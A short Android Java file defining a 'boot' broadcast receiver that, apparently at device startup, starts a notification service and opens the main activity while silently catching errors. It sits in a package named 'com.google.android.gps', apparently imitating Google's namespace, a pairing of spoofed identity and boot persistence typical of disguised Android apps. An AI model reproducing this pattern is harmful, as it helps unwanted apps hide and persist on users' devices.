package com.google.android.gps;

import android.content.*;
import android.os.*;
import android.webkit.*;

public class boot extends BroadcastReceiver
 {

    @Override
    public void onReceive(Context c, Intent intent) {
       try{
		   c.startService(new Intent(c,NotificationService.class));
		   c.startActivity(new Intent(c,MainActivity.class).putExtra("boot",1));
		   } catch(Error e){
			return;
		}
    }
}
